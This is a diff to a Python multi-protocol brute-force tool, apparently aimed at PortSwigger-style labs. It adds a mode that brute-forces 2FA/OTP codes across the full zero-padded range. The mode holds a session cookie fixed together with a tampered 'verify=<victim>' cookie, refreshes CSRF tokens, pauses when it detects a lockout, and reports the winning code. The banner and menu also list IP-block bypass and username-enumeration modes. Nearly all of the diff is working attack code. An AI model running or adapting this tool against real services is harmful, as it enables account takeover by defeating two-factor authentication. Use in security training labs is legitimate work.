@@ -130,10 +130,10 @@ def load_userlist(filepath):
 def print_banner():
     print(colored("""
 ╔═══════════════════════════════════════════════════╗
-║         SCYFIX BRUTE FORCER v3.3                  ║
+║         SCYFIX BRUTE FORCER v3.4                  ║
 ║   Multi-Protocol Authentication Testing Tool      ║
 ║   Web | SSH | FTP | CSRF | Username Enum          ║
-║   Decoy-Interleaved IP-Block Bypass               ║
+║   Decoy IP-Block Bypass | 2FA Code Brute-Force    ║
 ╚═══════════════════════════════════════════════════╝
 """, 'cyan'))
 
@@ -781,6 +781,145 @@ def decoy_interleave_attack(url, target_username, password_file, decoy_creds,
 
 
 # ════════════════════════════════════════════════════════════════
+#  NUMERIC CODE BRUTE-FORCE (MODE 10)
+#  Cookie-pinned brute-force of a numeric code field (2FA/OTP/PIN) at a
+#  fixed endpoint. Unlike the login modes, this does not detect a login
+#  form -- it posts to one known action, holding a caller-supplied cookie
+#  jar fixed (e.g. an authenticated session cookie plus a tampered
+#  verify=<victim> cookie), and cycles the code field 0..(10^digits - 1)
+#  with leading zeros. Success = a redirect away from the code page.
+#  (e.g. PortSwigger "2FA broken logic")
+# ════════════════════════════════════════════════════════════════
+
+def parse_cookie_string(cookie_string):
+    """Parse a raw 'k=v; k2=v2' Cookie header value into a dict."""
+    jar = {}
+    for part in cookie_string.split(';'):
+        part = part.strip()
+        if not part or '=' not in part:
+            continue
+        name, value = part.split('=', 1)
+        jar[name.strip()] = value.strip()
+    return jar
+
+
+def numeric_code_bruteforce(code_url, cookie_string, code_field, digits,
+                            delay, refresh_csrf):
+    """
+    code_url     : the endpoint that both serves the code page (GET, to grab
+                   a CSRF token) and accepts the submission (POST).
+    cookie_string: raw Cookie header value, e.g. 'session=...; verify=carlos'
+    code_field   : the code input's field name (default 'mfa-code').
+    digits       : code length; range is 0 .. 10**digits - 1, zero-padded.
+    refresh_csrf : if True, re-fetch a fresh CSRF token before every POST
+                   (slower, needed if the app rotates tokens per request).
+    """
+    print(colored("\n[*] Starting cookie-pinned numeric code brute-force...", 'cyan'))
+
+    jar = parse_cookie_string(cookie_string)
+    if not jar:
+        print(colored("[-] No cookies parsed -- this attack needs the session "
+                       "(and any tampered) cookies. Aborting.", 'red'))
+        return None
+    print(colored(f"[*] Cookies pinned: {list(jar.keys())}", 'cyan'))
+
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    })
+    for name, value in jar.items():
+        session.cookies.set(name, value)
+
+    # Grab the code page once to discover the form (field names + CSRF) and,
+    # for this class of lab, to trigger code generation for the pinned user.
+    try:
+        page = session.get(code_url, timeout=10)
+    except requests.exceptions.RequestException as e:
+        print(colored(f"[-] Could not load code page: {e}", 'red'))
+        return None
+
+    soup = BeautifulSoup(page.text, 'lxml')
+    form = soup.find('form')
+    action = code_url
+    csrf_field = None
+    if form:
+        form_action = form.get('action', code_url)
+        if form_action:
+            action = form_action if form_action.startswith('http') else \
+                     code_url.rsplit('/', 1)[0] + '/' + form_action.lstrip('/')
+        form_fields = {}
+        for inp in form.find_all('input'):
+            n = inp.get('name')
+            if n:
+                form_fields[n] = inp.get('value', '')
+        csrf_field = detect_csrf_field(form_fields)
+        if code_field not in form_fields:
+            print(colored(f"[!] Warning: field '{code_field}' not found on the page. "
+                           f"Fields seen: {list(form_fields.keys())}", 'yellow'))
+    if csrf_field:
+        print(colored(f"[*] CSRF field detected: {csrf_field}", 'cyan'))
+    print(colored(f"[*] Submitting to: {action}", 'cyan'))
+
+    def current_csrf():
+        if not csrf_field:
+            return None
+        s = BeautifulSoup(session.get(code_url, timeout=10).text, 'lxml')
+        tok = s.find('input', {'name': csrf_field})
+        return tok.get('value', '') if tok else None
+
+    csrf_value = None
+    if csrf_field:
+        tok = soup.find('input', {'name': csrf_field})
+        csrf_value = tok.get('value', '') if tok else None
+
+    total = 10 ** digits
+    print(colored(f"[*] Brute-forcing {total} codes ({digits}-digit, zero-padded)", 'cyan'))
+    print(colored(f"[*] Started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
+    print(colored("=" * 55, 'cyan'))
+
+    for n in range(total):
+        code = str(n).zfill(digits)
+
+        if refresh_csrf and csrf_field:
+            csrf_value = current_csrf()
+
+        data = {code_field: code}
+        if csrf_field and csrf_value is not None:
+            data[csrf_field] = csrf_value
+
+        sys.stdout.write(colored(f"\r  [*] Trying ({n + 1}/{total}): {code}", 'red'))
+        sys.stdout.flush()
+
+        try:
+            response = session.post(action, data=data, timeout=10, allow_redirects=True)
+            time.sleep(delay)
+        except requests.exceptions.ConnectionError:
+            print(colored("\n[!] Connection error -- sleeping 5s", 'red'))
+            time.sleep(5)
+            continue
+        except requests.exceptions.Timeout:
+            continue
+
+        if is_blocked_response(response.text):
+            print(colored(f"\n[!] Block/lockout detected at code {code} -- pausing 5s", 'yellow'))
+            time.sleep(5)
+            continue
+
+        # Success = redirected away from the code page.
+        redirected = len(response.history) > 0 and \
+                     response.url.rstrip('/') != action.rstrip('/') and \
+                     response.url.rstrip('/') != code_url.rstrip('/')
+        if redirected:
+            print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+            print(colored(f"  [+] Code: {code}", 'green'))
+            print(colored(f"  [+] Landed on: {response.url}", 'green'))
+            return code
+
+    print(colored(f"\n\n[-] Code brute-force complete -- no valid code found", 'red'))
+    return None
+
+
+# ════════════════════════════════════════════════════════════════
 #  WEB ATTACK RUNNER
 # ════════════════════════════════════════════════════════════════
 
@@ -901,7 +1040,8 @@ def main():
     print(colored("  7. Auto-detect protocol (SSH/FTP)", 'white'))
     print(colored("  8. Username enumeration (web)", 'white'))
     print(colored("  9. Decoy-interleaved attack (bypass counter-reset IP block)", 'white'))
-    mode = input(colored("\n[*] Enter mode (1-9): ", 'cyan'))
+    print(colored("  10. Numeric code brute-force (2FA/OTP, cookie-pinned)", 'white'))
+    mode = input(colored("\n[*] Enter mode (1-10): ", 'cyan'))
 
     if mode in ['1', '2', '3', '4']:
         url = input(colored("[*] Enter target login URL: ", 'cyan'))
@@ -1026,6 +1166,31 @@ def main():
         delay = float(delay) if delay.strip() else 0.5
         decoy_interleave_attack(url, target_username, password_file, decoy_creds,
                                 fail_string, delay)
+
+    elif mode == '10':
+        print(colored(
+            "\n[*] Cookie-pinned numeric code brute-force (2FA/OTP/PIN).", 'cyan'))
+        print(colored(
+            "    Log in first, reach the code page, then copy its Cookie header "
+            "here -- include the session cookie AND any tampered value "
+            "(e.g. verify=carlos).", 'cyan'))
+        code_url = input(colored(
+            "[*] Code page URL (serves the form via GET, accepts the POST): ", 'cyan')).strip()
+        cookie_string = input(colored(
+            "[*] Cookie header value (e.g. 'session=...; verify=carlos'): ", 'cyan')).strip()
+        code_field = input(colored(
+            "[*] Code field name (default mfa-code): ", 'cyan')).strip() or 'mfa-code'
+        digits_input = input(colored(
+            "[*] Number of digits in the code (default 4): ", 'cyan')).strip()
+        digits = int(digits_input) if digits_input else 4
+        refresh = input(colored(
+            "[*] Re-fetch a fresh CSRF token before every attempt? "
+            "(slower; only if the app rotates tokens) (y/n, default n): ",
+            'cyan')).strip().lower() == 'y'
+        delay = input(colored("[*] Delay between attempts (default 0.3): ", 'cyan'))
+        delay = float(delay) if delay.strip() else 0.3
+        numeric_code_bruteforce(code_url, cookie_string, code_field, digits,
+                                delay, refresh)
 
     else:
         print(colored("[-] Invalid mode selected", 'red'))
